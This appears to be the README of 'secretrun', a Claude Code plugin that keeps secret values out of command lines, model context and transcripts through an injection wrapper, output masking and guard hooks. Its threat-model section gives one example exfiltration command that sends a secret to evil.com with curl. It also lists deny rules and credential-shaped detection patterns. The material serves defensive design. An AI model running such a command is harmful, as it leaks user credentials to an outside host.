# secretrun

**Keep secret _values_ out of Claude Code.** The model handles secret _names_;
the `secretrun` wrapper resolves `name → value` inside its own process, injects
the value into a child command's environment (or stdin), and masks every
occurrence of the value out of the child's output. Nothing lands in `argv`, in
the model's context, or in the Claude Code transcript.

> Built after CrowdStrike flagged plaintext secret values in the command lines of
> processes Claude Code had spawned. This plugin closes those channels.

---

## The leak channels (and how secretrun closes each)

| Channel | How values leak | secretrun's answer |
|---|---|---|
| **argv** | `curl -H "Bearer sk-…"` is visible to monitoring tools, `ps`, and the model | The model writes `secretrun NAME -- curl …`; only the NAME is in argv. Verified: `ps -axww` during a run shows no value. |
| **Context / transcript** | Anything the model reads (`.env`, `echo $KEY`, API errors) persists in plaintext in `~/.claude/projects/*.jsonl` | The value never enters the model's turn: the wrapper resolves it, and masks it out of child output. A guard hook blocks the fishing commands. |
| **Env inheritance** | Bash/hooks/plugins/MCP all inherit `claude`'s env; one `printenv` dumps everything | Values are never placed in `claude`'s env — only in the short-lived child. `printenv`/`env` dumps are denied. |
| **Cross-session** | env/settings/transcripts persist across sessions | No secret is ever written to any of those. Storage is Keychain / cloud SM only. |

---

## How it works

**Exec-time injection wrapper + hook guardrails.** `secretrun NAME -- cmd`
resolves the secret, runs `cmd` with the value present only in the child's
environment, and streams the child's merged output through a masker that rewrites
each value (and its base64 / URL-encoded / JSON-escaped forms) to `[REDACTED:NAME]`.
Three hooks back it up:

- **`secret_guard.py`** (PreToolUse · Bash) denies keychain dumps, direct
  `security … -w` reads, reads of `~/.claude/projects/**`, `env`/`printenv`
  dumps, and any attempt to put a value on the `secretrun add` command line.
- **`redact_output.py`** (PostToolUse) scrubs credential-_shaped_ strings
  (`sk-`, `ghp_`, `AKIA…`, JWT, PEM, keyword-adjacent tokens, …) that arrive via
  channels the wrapper never saw — an API error body, a config file, a webpage.
  It never reads real stored values.
- **`session_env.sh`** (SessionStart) puts `secretrun` on `PATH`.

**Native hardening.** Plugins cannot ship permission rules, so
`/secretrun:harden` merges them into your `settings.json`: `permissions.deny` for
`.env*`, `~/.aws`, `~/.ssh`, `~/.config/gcloud`, `~/.claude/projects`;
`CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1`; and `cleanupPeriodDays: 7`. Zero ceremony,
and it pairs with S1.

### Why not a broker? (considered and rejected)

An MCP "secret broker" server was considered and **rejected** for this threat
model. It adds ceremony per use case (every tool needs a broker-aware call path),
and — critically — the broker process would itself see plaintext values, so it
buys little over a single hardened wrapper while adding a long-lived process and a
new dependency. A short-lived, stdlib-only, single-file wrapper is a smaller and
more auditable trust boundary.

---

## Threat model — what it does and does not stop

**Stops:** secret values in argv, in model context, in the transcript, and in
`claude`'s inheritable env; accidental reads of secret files; credential-shaped
strings surfacing in tool output.

**Explicitly does _not_ stop (be honest):**

- **Deliberate exfiltration by the child.** `secretrun NAME -- curl evil.com?t=$NAME`
  sends the real value over the network — masking covers _output_, not egress.
  The guard cannot reliably distinguish this from legitimate use; network egress
  is the domain of a sandbox network allowlist and your own review.
- **Same-user `ps -Eww` reading the child's env.** Any process you own can read
  your processes' environments. Use `--stdin NAME` for tools that accept the
  secret on stdin (`gh auth login --with-token`, `docker login --password-stdin`)
  to keep it out of the child env entirely.
- **Perfect in-memory zeroization.** CPython cannot guarantee it (see
  `docs/VALIDATION.md`). The primary controls are the wrapper's very short
  lifetime, disabled core dumps, and a traceback-scrubbing excepthook.
- **Keychain audit trail.** macOS Keychain has limited per-access auditing; cloud
  backends (AWS/GCP) provide IAM + access logs.

The redactor complements — it does not replace — a real DLP/EDR layer (e.g. the
sibling `edr` plugin).

---

## Using secretrun from a Claude project

1. **Once per machine.** Add the marketplace and install:
   ```
   /plugin marketplace add lalec/agent-plugins
   /plugin install secretrun@agent-plugins
   ```
   Enable at **user scope** so the hooks + skill cover all projects (opt a project
   out via its `enabledPlugins`).
2. **Once per scope.** Harden native settings: `/secretrun:harden --global`
   (or `--project`). Applies to **new** sessions.
3. **Per project (optional).** Commit a `.secretrun.json` declaring the secret
   names the project needs (values are never in it):
   ```json
   { "secrets": {
       "OPENAI_API_KEY": { "backend": "keychain" },
       "PROD_DB_URL":    { "backend": "aws", "id": "prod/db/url" }
   } }
   ```
   Run `/secretrun:doctor` to verify every entry resolves.
4. **Storing secrets.** You (not the model) type the value:
   ```
   secretrun add OPENAI_API_KEY
   ```
   In a real terminal this is a hidden prompt. Inside a Claude Code session
   (no terminal available) a native macOS hidden-input dialog pops up instead —
   either way the value goes straight to the backend and Claude never sees it.
   Teammates clone the repo, install the plugin, and `add` their own copy of
   each named secret.
5. **Daily use.** Nothing — the `using-secrets` skill auto-triggers and Claude runs
   `secretrun NAME -- cmd`.

### MCP servers (no token in the config file)

MCP server entries normally force a plaintext token into the config's `env`
block. Instead, make `secretrun` the server's launcher — the MCP client starts
it, it resolves the NAME, and the value exists only in the server process's env:

```json
{ "mcpServers": {
    "brevo": {
      "command": "/absolute/path/to/secretrun",
      "args": ["BREVO_MCP_TOKEN", "--",
               "npx", "mcp-remote", "https://mcp.brevo.com/v1/brevo/mcp",
               "--header", "Authorization:Bearer ${BREVO_MCP_TOKEN}"]
    }
} }
```

Store the token once with `secretrun add BREVO_MCP_TOKEN` and drop the `env`
block entirely. The pieces that make this work:

- **Servers that read an env var** (the usual `"env": {"API_KEY": "…"}` case)
  need nothing else: `secretrun API_KEY -- npx <server>` replaces the block.
- **`${…}` placeholders in args** (the `mcp-remote --header` pattern) pass
  through intact: Claude Code leaves an unset `${VAR}` as literal text (the
  missing-variable warning in `claude mcp list` is expected), and Claude
  Desktop does no expansion at all — so the placeholder reaches `mcp-remote`,
  which interpolates it from the env secretrun injected. The value is never in
  the config, in `claude`'s env, or in any argv.
- **`command` must be an absolute path** (`which secretrun` in a session prints
  it): MCP clients launch servers with the login environment, before the
  plugin's SessionStart PATH hook applies.
- The server's stdio passes through the masker line-by-line, so a token echoed
  in an error reaches the model as `[REDACTED:NAME]`.

### CLI

```
secretrun NAME [NAME...] [-b BACKEND] [--stdin NAME] -- cmd args...
secretrun add NAME [-b BACKEND]     # hidden prompt (TTY) or macOS dialog (no TTY)
secretrun ls  [-b BACKEND]          # list stored names (keychain: local index, no dump)
secretrun rm  NAME [-b BACKEND]
secretrun sync [-b BACKEND]         # rebuild keychain name index (only bulk keychain read)
secretrun check                     # verify .secretrun.json entries resolve
secretrun sessions [--all]          # list Claude sessions as redacted metadata
secretrun session <id>              # one session's metadata (files, git, label)
secretrun usage [--all] [--since D] # tokens + cost per session and model
secretrun-admin doctor | harden --project|--global
```

**Debugging sessions.** The hardening blocks raw reads of `~/.claude/projects/**`
(transcripts are plaintext history that can pull previously-seen secret values
back into context). `secretrun sessions` / `secretrun session <id>` are the
sanctioned alternative: they read transcripts *inside the wrapper* and surface
only structural metadata (id, cwd, timestamps, files touched, git commands) plus
a shape-redacted one-line label — never raw message content. Same contract as
`run`: the wrapper is the only process that touches the sensitive source, and it
masks what it emits.

**Token usage and cost.** `secretrun usage` answers "what did this cost?" from the
same transcripts while emitting **numbers only** — no labels, no paths, no content,
so it is strictly narrower than `sessions`. It reads each assistant turn's
`usage` block (deduped by message id — Claude Code repeats the same usage on one
record per content block), splits cache writes by TTL because 1-hour writes cost
2× input vs 1.25× for 5-minute, and prices per model:

```
SESSION    LAST ACTIVE      MODEL             INPUT   OUTPUT  CACHE-W   CACHE-R   COST USD
7ca3e1ee   2026-08-10 06:52 opus-5               43    26.5k   400.4k      6.5M       7.92
```

Prices are **data, never inferred**: `share/prices.json` (per-MTok list prices +
cache multipliers, with a dated `updated` field printed in the footer). Override
it with `$SECRETRUN_PRICES` or `~/.secretrun/prices.json`. A model missing from
the table reports its tokens with a `—` cost and is named in the footer, so an
out-of-date table shows up as a gap rather than a wrong number.

Backends: `keychain` (default, macOS `security`), `aws` (Secrets Manager),
`gcp` (Secret Manager). Pluggable via the resolver map in `bin/secretrun`.

### At-rest access control

Keychain items are stored under a dedicated service, `secretrun`. By default the
`security` tool is trusted for convenience (no prompt per access). For a
high-value item you can require a prompt on every access by adding it with an
empty trusted-app list:

```
security add-generic-password -s secretrun -a NAME -T "" -w   # then enter value
```

(Run `secretrun sync` afterward so `ls` picks up a secret stored this way.)

### Listing without dumping the keychain

`secretrun ls` reads a local **names-only** index (`~/.secretrun/keychain-names.json`;
set `$SECRETRUN_HOME` to relocate) rather than enumerating the keychain — so it
emits no `security dump-keychain`, the call endpoint EDR/DLP tools flag as bulk
credential enumeration. `add`/`rm` keep the index current; it is bootstrapped once
on first `ls`, and `secretrun sync` rebuilds it authoritatively (the only command
that reads the keychain in bulk — run it after storing a secret outside secretrun).
Secret **values are never written** to the index; names are not secret (the manifest
already commits them). The `aws`/`gcp` backends list via their own APIs and are
unaffected.

### Optional: sandbox

For stronger isolation you can add a `sandbox` block to `settings.json` (review
first — it can break tools that need network or broad filesystem access):

```json
{ "sandbox": {
    "network": { "allowUnixSockets": true, "allow": [{ "host": "api.openai.com" }] },
    "denyRead": ["**/.env*", "~/.aws/**", "~/.ssh/**"]
} }
```

See `docs/VALIDATION.md` for the doc references and best-practice mapping.

## Alternatives to the built-in backends

- **1Password:** `op` is not a bundled backend; use `op run -- secretrun-style`
  injection or `op read` inside a `secretrun` child.
- **Other vaults:** add a resolver to the `RESOLVERS` map in `bin/secretrun`
  (one function, `name → bytearray`).
